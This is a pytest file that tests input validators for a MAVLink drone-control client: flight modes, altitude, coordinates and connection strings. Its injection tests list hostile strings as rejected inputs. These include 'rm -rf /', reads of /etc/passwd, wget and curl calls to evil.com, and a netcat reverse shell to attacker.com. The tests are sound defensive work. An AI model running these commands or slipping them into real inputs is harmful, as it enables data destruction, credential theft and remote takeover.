"""Security tests for input validation."""

import sys
import os
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# Input validation functions to be added to mavlink_client.py
def validate_mode(mode: str) -> bool:
    """Validate flight mode name.

    Args:
        mode: Flight mode string.

    Returns:
        True if valid mode name.
    """
    valid_modes = {
        'STABILIZE', 'ACRO', 'ALT_HOLD', 'AUTO', 'GUIDED', 'LOITER',
        'RTL', 'CIRCLE', 'LAND', 'DRIFT', 'SPORT', 'FLIP', 'AUTOTUNE',
        'POSHOLD', 'BRAKE', 'THROW', 'AVOID_ADSB', 'GUIDED_NOGPS',
        'SMART_RTL', 'FLOWHOLD', 'FOLLOW', 'ZIGZAG', 'SYSTEMID',
        'AUTOROTATE', 'AUTO_RTL', 'TURTLE',
        # Plane modes
        'MANUAL', 'TRAINING', 'FLY_BY_WIRE_A', 'FLY_BY_WIRE_B',
        'CRUISE', 'TAKEOFF', 'QSTABILIZE', 'QHOVER', 'QLOITER',
        'QLAND', 'QRTL', 'QAUTOTUNE', 'QACRO', 'THERMAL',
    }
    if not isinstance(mode, str):
        return False
    return mode.upper() in valid_modes


def validate_altitude(altitude: float) -> bool:
    """Validate altitude value.

    Args:
        altitude: Altitude in meters.

    Returns:
        True if valid altitude.
    """
    if not isinstance(altitude, (int, float)):
        return False
    # Reasonable bounds: 0 to 10000 meters
    return 0 <= altitude <= 10000


def validate_coordinates(lat: float, lon: float) -> bool:
    """Validate latitude and longitude.

    Args:
        lat: Latitude in degrees.
        lon: Longitude in degrees.

    Returns:
        True if valid coordinates.
    """
    if not isinstance(lat, (int, float)) or not isinstance(lon, (int, float)):
        return False
    return -90 <= lat <= 90 and -180 <= lon <= 180


def validate_connection_string(conn_str: str) -> bool:
    """Validate MAVLink connection string.

    Args:
        conn_str: Connection string (e.g., 'udp:127.0.0.1:14550').

    Returns:
        True if valid connection string.
    """
    if not isinstance(conn_str, str):
        return False

    # Check for shell injection characters
    dangerous_chars = [';', '|', '&', '$', '`', '>', '<', '\n', '\r']
    for char in dangerous_chars:
        if char in conn_str:
            return False

    # Valid prefixes
    valid_prefixes = ['udp:', 'tcp:', 'udpin:', 'udpout:', 'tcpin:', '/dev/', 'com']
    conn_lower = conn_str.lower()

    return any(conn_lower.startswith(prefix) for prefix in valid_prefixes)


class TestModeValidation:
    """Test flight mode validation."""

    def test_valid_copter_modes(self):
        """Test valid ArduCopter modes."""
        valid_modes = ['STABILIZE', 'GUIDED', 'AUTO', 'LOITER', 'RTL', 'LAND']
        for mode in valid_modes:
            assert validate_mode(mode) is True, f"Mode {mode} should be valid"

    def test_valid_plane_modes(self):
        """Test valid ArduPlane modes."""
        valid_modes = ['MANUAL', 'AUTO', 'GUIDED', 'QHOVER', 'QLOITER', 'QLAND']
        for mode in valid_modes:
            assert validate_mode(mode) is True, f"Mode {mode} should be valid"

    def test_case_insensitive(self):
        """Test mode validation is case insensitive."""
        assert validate_mode('guided') is True
        assert validate_mode('GUIDED') is True
        assert validate_mode('Guided') is True

    def test_invalid_modes(self):
        """Test invalid mode names are rejected."""
        invalid_modes = ['INVALID', 'HACKED', '', 'DROP_TABLES', 'rm -rf']
        for mode in invalid_modes:
            assert validate_mode(mode) is False, f"Mode {mode} should be invalid"

    def test_injection_attempts(self):
        """Test mode validation rejects injection attempts."""
        injections = [
            "GUIDED; rm -rf /",
            "GUIDED && cat /etc/passwd",
            "GUIDED | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
        ]
        for injection in injections:
            assert validate_mode(injection) is False

    def test_non_string_input(self):
        """Test non-string inputs are rejected."""
        assert validate_mode(123) is False
        assert validate_mode(None) is False
        assert validate_mode(['GUIDED']) is False


class TestAltitudeValidation:
    """Test altitude value validation."""

    def test_valid_altitudes(self):
        """Test valid altitude values."""
        valid_alts = [0, 10, 100, 500, 1000, 5000, 10000]
        for alt in valid_alts:
            assert validate_altitude(alt) is True, f"Altitude {alt} should be valid"

    def test_valid_float_altitudes(self):
        """Test valid float altitude values."""
        assert validate_altitude(10.5) is True
        assert validate_altitude(0.1) is True

    def test_negative_altitude(self):
        """Test negative altitudes are rejected."""
        assert validate_altitude(-1) is False
        assert validate_altitude(-100) is False

    def test_extreme_altitude(self):
        """Test extreme altitudes are rejected."""
        assert validate_altitude(10001) is False
        assert validate_altitude(100000) is False
        assert validate_altitude(float('inf')) is False

    def test_non_numeric_input(self):
        """Test non-numeric inputs are rejected."""
        assert validate_altitude("100") is False
        assert validate_altitude(None) is False
        assert validate_altitude([100]) is False


class TestCoordinateValidation:
    """Test coordinate validation."""

    def test_valid_coordinates(self):
        """Test valid lat/lon pairs."""
        valid_coords = [
            (0, 0),
            (45.0, -93.0),
            (-33.9, 151.2),
            (90, 180),
            (-90, -180),
        ]
        for lat, lon in valid_coords:
            assert validate_coordinates(lat, lon) is True

    def test_invalid_latitude(self):
        """Test invalid latitude values."""
        assert validate_coordinates(91, 0) is False
        assert validate_coordinates(-91, 0) is False

    def test_invalid_longitude(self):
        """Test invalid longitude values."""
        assert validate_coordinates(0, 181) is False
        assert validate_coordinates(0, -181) is False

    def test_non_numeric_coordinates(self):
        """Test non-numeric coordinates are rejected."""
        assert validate_coordinates("45", 0) is False
        assert validate_coordinates(0, "93") is False
        assert validate_coordinates(None, None) is False


class TestConnectionStringValidation:
    """Test connection string validation."""

    def test_valid_udp_connection(self):
        """Test valid UDP connection strings."""
        valid = [
            'udp:127.0.0.1:14550',
            'udp:192.168.1.100:14551',
            'udpin:0.0.0.0:14550',
            'udpout:10.0.0.1:14550',
        ]
        for conn in valid:
            assert validate_connection_string(conn) is True

    def test_valid_tcp_connection(self):
        """Test valid TCP connection strings."""
        valid = [
            'tcp:127.0.0.1:5760',
            'tcp:192.168.1.100:5762',
            'tcpin:0.0.0.0:5760',
        ]
        for conn in valid:
            assert validate_connection_string(conn) is True

    def test_valid_serial_connection(self):
        """Test valid serial connection strings."""
        valid = [
            '/dev/ttyUSB0',
            '/dev/ttyACM0',
            '/dev/serial0',
            'COM3',
            'com1',
        ]
        for conn in valid:
            assert validate_connection_string(conn) is True

    def test_injection_attempts(self):
        """Test connection string rejects injection attempts."""
        injections = [
            'udp:127.0.0.1:14550; rm -rf /',
            'tcp:127.0.0.1:5760 | cat /etc/passwd',
            'udp:127.0.0.1:14550 && wget evil.com',
            '$(curl evil.com)',
            '`nc -e /bin/sh attacker.com 4444`',
            'udp:127.0.0.1:14550\nrm -rf /',
        ]
        for injection in injections:
            assert validate_connection_string(injection) is False

    def test_invalid_prefix(self):
        """Test invalid connection prefixes are rejected."""
        invalid = [
            'http://127.0.0.1:14550',
            'ftp://files.com',
            'file:///etc/passwd',
            'javascript:alert(1)',
        ]
        for conn in invalid:
            assert validate_connection_string(conn) is False

    def test_non_string_input(self):
        """Test non-string inputs are rejected."""
        assert validate_connection_string(14550) is False
        assert validate_connection_string(None) is False
        assert validate_connection_string(['udp:127.0.0.1:14550']) is False
